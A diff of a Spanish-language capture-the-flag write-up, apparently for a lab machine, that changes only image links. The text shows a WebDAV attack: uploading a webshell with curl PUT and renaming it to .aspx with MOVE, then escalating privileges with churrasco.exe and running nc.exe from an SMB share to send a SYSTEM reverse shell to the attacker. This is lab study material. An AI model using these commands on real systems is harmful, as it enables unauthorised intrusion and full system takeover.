@@ -16,21 +16,21 @@ Token Kidnapping - Churrasco [Privilege Escalation]
 
 Primeramente determinamos el **SO** lanzando un paquete **ICMP** con **ping** para determinar ante que tipo de máquina estamos. 
 
-![[Pasted image 20251120132446.png]]
+![](../imgs/Pasted image 20251120132446.png)
 
 El primer escaneo está enfocado en reconocer todos los puertos abiertos de un Dispositivo. **Para este escaneo utilizaremos un SYN scan** . 
 
 Para la segunda parte del escaneo **utilizaremos los scripts que trae por defecto nmap**. El fin de esta segunda etapa es obtener más detalles de los puertos previamente descubiertos 
 
-![[Pasted image 20251120121612.png]]
+![](../imgs/Pasted image 20251120121612.png)
 
 **Descubrimos el puerto 80 abierto** por lo que hay una página corriendo. **Además de eso, descubrimos diferentes [[Métodos HTTP]]** Y **[[WebDAV]]** disponible.
 
-![[Pasted image 20251120123750.png]]
+![](../imgs/Pasted image 20251120123750.png)
 
 **No encontramos nada en la web** por lo que proseguimos a utilizar **[[davtest]]** para **identificar qué podemos hacer con webdav** 
 
-![[Pasted image 20251120124104.png]]
+![](../imgs/Pasted image 20251120124104.png)
 
 De acuerdo a **[[WebDAV]]** podemos subir algunos archivos pero no **[[aspx]]** ni **[[php]]** además podemos ejecutar archivos **.txt** y **.html**. 
 
@@ -42,9 +42,9 @@ Proseguimos a subir con **PUT** un archivo txt a ver si lo podemos ejecutar.
 curl -X PUT http://10.10.10.15/cmd.txt -d @cmd.txt
 ```
 
-![[Pasted image 20251120132826.png]]
+![](../imgs/Pasted image 20251120132826.png)
 
-![[Pasted image 20251120132837.png]]
+![](../imgs/Pasted image 20251120132837.png)
 
 **Ya que no tenemos permisos para subir archivos [[aspx]]** entonces subimos en **.txt** una **webshell** para posteriormente a través del **método MOVE** cambiar el nombre a un archivo [[aspx]]. 
 
@@ -54,7 +54,7 @@ locate .aspx
 
 
 
-![[Pasted image 20251120133136.png]]
+![](../imgs/Pasted image 20251120133136.png)
 
 **Subimos el archivo con PUT**
 
@@ -71,9 +71,9 @@ curl -X PUT "http://10.10.10.15/cmd.txt" -d @cmd.txt
 curl -X MOVE "http://10.10.10.15/cmd.txt" -H "Destination:http://10.10.10.15/cmd.aspx"
 ```
 
-![[Pasted image 20251120133858.png]]
+![](../imgs/Pasted image 20251120133858.png)
 
-![[Pasted image 20251120133947.png]]
+![](../imgs/Pasted image 20251120133947.png)
 
 **Tenemos ejecución de comandos** 
 
@@ -98,7 +98,7 @@ nos ponemos en escucha con **rlwrap y [[NETCAT]]**
 
 
 
-![[Pasted image 20251120135022.png]]
+![](../imgs/Pasted image 20251120135022.png)
 
 **Ganamos conexión**
 
@@ -106,11 +106,11 @@ nos ponemos en escucha con **rlwrap y [[NETCAT]]**
 
 **Empezamos con algunos [[Comandos utiles para escalar]]** en este caso en Windows
 
-![[Pasted image 20251120135622.png]]
+![](../imgs/Pasted image 20251120135622.png)
 
 **Encontramos el [[SeImpersonatePrivilege]] encendido** por lo que podemos abusar de **[[JuicyPotato]] o [[churrasco.exe]]**. Generalmente cuando estamos **Ante una versión antigua como en este caso**:
 
-![[Pasted image 20251120140445.png]]
+![](../imgs/Pasted image 20251120140445.png)
 
 **Utilizamos [[churrasco.exe]]** 
 
@@ -122,7 +122,7 @@ impacket-smbserver smbFolder $(pwd) -smb2support
 ```
 
 
-![[Pasted image 20251120143543.png]]
+![](../imgs/Pasted image 20251120143543.png)
 
 **Churrasco ejecuta comandos a nivel Authority system** por lo que si ejecutamos el **nc.exe** d enuestro recurso compartido y nos enviamos una shell **resiviremos la shell como AUhtority system**
 
@@ -132,4 +132,4 @@ churrasco.exe "\\10.10.16.3\smbFolder\nc.exe -e cmd 10.10.16.3 4444"
 
 Nos ponemos en escucha y lo ejecutamos.
 
-![[Pasted image 20251120143842.png]]
+![](../imgs/Pasted image 20251120143842.png)
